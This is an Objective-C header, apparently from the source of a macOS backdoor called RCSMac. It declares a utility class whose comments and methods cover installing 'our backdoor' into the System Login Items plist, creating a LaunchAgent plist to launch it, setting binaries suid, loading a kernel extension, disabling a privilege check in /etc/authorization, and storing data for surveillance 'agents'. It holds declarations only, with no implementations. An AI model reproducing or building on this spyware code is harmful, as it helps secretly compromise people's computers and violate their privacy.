/*
 * RCSMac - Utils
 *
 * Created by Alfredo 'revenge' Pesoli on 27/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __RCSMUtils_h__
#define __RCSMUtils_h__


//
// This class is a singleton
//
@interface __m_MUtils : NSObject
{
@private
  NSString *mBackdoorPath;
  NSString *mKext32Path;
  NSString *mKext64Path;
  NSString *mSLIPlistPath;
  NSString *mServiceLoaderPath;
  NSString *mExecFlag;
}

@property (readwrite, retain) NSString *mBackdoorPath;
@property (readwrite, retain) NSString *mKext32Path;
@property (readwrite, retain) NSString *mKext64Path;
@property (readwrite, retain) NSString *mSLIPlistPath;
@property (readwrite, retain) NSString *mServiceLoaderPath;
@property (readwrite, retain) NSString *mExecFlag;

+ (__m_MUtils *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;

- (id)copyWithZone:  (NSZone *)aZone;
- (id)init;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

// 
// Execute a system command
// Arguments can be nil
//
- (void)executeTask: (NSString *)anAppPath
      withArguments: (NSArray *)arguments
       waitUntilEnd: (BOOL)waitForExecution;

//
// Add an entry to the global SLI plist file for our backdoor
//
- (BOOL)removeBackdoorFromSLIPlist;
- (BOOL)addBackdoorToSLIPlist;

//
// Create the global SLI plist file from scratch
//
- (BOOL)createSLIPlistWithBackdoor;

// 
// Search the global SLI plist file for the given key, used for verifying if
// the backdoor is already present in the file
//
- (BOOL)searchSLIPlistForKey: (NSString *)aKey;

//
// Save the global SLI plist file
//
- (BOOL)saveSLIPlist: (id)anObject atPath: (NSString *)aPath;

//
// Create the launchctl plist file used for launching the backdoor
//
- (BOOL)createLaunchAgentPlist: (NSString *)aLabel
                     forBinary: (NSString *)aBinary;

//
// Create the bash script which will load our backdoor from LaunchDaemons
//
#if 0
- (BOOL)createBackdoorLoader;
#endif

//
// Return YES if the backdoor has been already added to the global SLI file
//
- (BOOL)isBackdoorPresentInSLI: (NSString *)aKey;

//
// Make a binary suid
//
- (BOOL)makeSuidBinary: (NSString *)aBinary;

//
// Open the System Login Items plist
//
- (id)openSLIPlist;

//
// Drop the execution flag which tells the backdoor that it has been executed
// at least once
//
- (BOOL)dropExecFlag;

//
// Unload our kext
//
- (BOOL)unloadKext;

//
// Load our kext
//
- (BOOL)loadKextFor64bit: (BOOL)is64bit;

//
// Disable system.privilege.setugid_appkit in /etc/authorization
//
- (BOOL)disableSetugidAuth;

//
// Enable system.privilege.setugid_appkit in /etc/authorization
//
- (BOOL)enableSetugidAuth;

- (BOOL)isMaverics;

//
// Return TRUE if we are on MacOS X Lion (10.7.x)
//
- (BOOL)isLion;

//
// Return TRUE if we are on MacOS X Mt Lion (10.8.x)
//
- (BOOL)isMtLion;

//
// Return TRUE if we are on MacOS X Leopard (10.5.x)
//
- (BOOL)isLeopard;

//
// Return TRUE if we are on MacOS X Snow Leopard (10.6.x)
//
- (BOOL)isSnowLeopard;


//
// Used by agents to store their data (e.g. markups)
//
- (BOOL)setPropertyWithName:(NSString*)name
             withDictionary:(NSDictionary*)dictionary;

- (id)getPropertyWithName:(NSString*)name;

@end

#endif
